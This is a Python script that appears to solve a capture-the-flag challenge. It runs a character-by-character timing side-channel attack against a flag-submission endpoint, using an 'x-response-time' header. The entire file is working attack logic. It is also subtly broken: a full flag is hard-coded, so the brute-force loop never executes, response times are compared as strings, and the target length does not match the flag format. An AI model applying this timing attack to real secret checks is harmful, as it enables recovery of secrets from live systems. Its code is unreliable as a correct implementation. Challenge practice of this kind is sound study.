import requests

MD5_CHARSET = '0123456789abcdef'
TARGET_LENGTH = 37; # flag{32 char hash}
FLAG = "flag{77ba0346d9565e77344b9fe40ecf1369}"
URL = ""
REQUESTS_TIMES = []
MAX_TRIES = 11

def make_requests(char):
    print(f'TRYING CHAR: ' + char)
    response = requests.get("http://" + URL + "/submit?flag=" + FLAG + char)
    if (response.status_code == 200):
        elapsedTime = response.headers.get("x-response-time")
        print(f'Request done with response time: ' + elapsedTime)
        REQUESTS_TIMES.append(elapsedTime)
    else:
        print(f'An error occured when sending request to {URL}')

if __name__ == '__main__':
    left_requests = 0

    while len(FLAG) < TARGET_LENGTH:
        print(f'FLAG LENGTH {len(FLAG) - 4}')
        for char in MD5_CHARSET:
            if left_requests == 0:
                URL = input('URL: ').strip()
                if not URL:
                    print("Invalid URL. Try again.")
                    left_requests = 0
                    while not URL:
                        URL = input('URL: ').strip()
                left_requests = MAX_TRIES

            make_requests(char)

            left_requests -= 1

        most_elapsed_time = max(REQUESTS_TIMES)
        most_elapsed_char = MD5_CHARSET.__getitem__(REQUESTS_TIMES.index(most_elapsed_time))

        FLAG = FLAG + most_elapsed_char
        print(f'Got char: {most_elapsed_char}. Flag: {FLAG}')

        REQUESTS_TIMES = []

    print(f'Final FLAG: {FLAG}')